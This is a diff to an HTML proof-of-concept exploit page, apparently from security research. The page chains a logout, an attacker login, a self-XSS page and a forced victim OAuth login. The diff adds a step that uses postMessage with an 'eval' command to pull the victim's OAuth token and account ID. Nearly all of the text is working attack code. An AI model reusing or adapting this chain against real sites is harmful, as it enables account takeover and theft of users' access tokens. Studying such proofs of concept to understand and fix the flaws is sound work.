@@ -49,12 +49,20 @@
             handle2 = window.open(goauth_url,"");
         }
 
+        function step5(){
+            handle.postMessage({
+                'type': 'eval',
+                'data': 'getOAUTH()'
+              }, "*")
+        }
+
     </script>
     <form action="#">
         <input type="button" value="Step 1" onclick="step1();" /> : Logout the Victim <br />
         <input type="button" value="Step 2" onclick="step2();" /> : Login as the Attacker <br />
         <input type="button" value="Step 3" onclick="step3();" /> : Load the self XSS page <br />
         <input type="button" value="Step 4" onclick="step4();" /> : Trigger the connexion of victim <br />
+        <input type="button" value="Step 5" onclick="step5();" /> : Retrieve Token and Account ID <br />
     </form>
 </body>
 
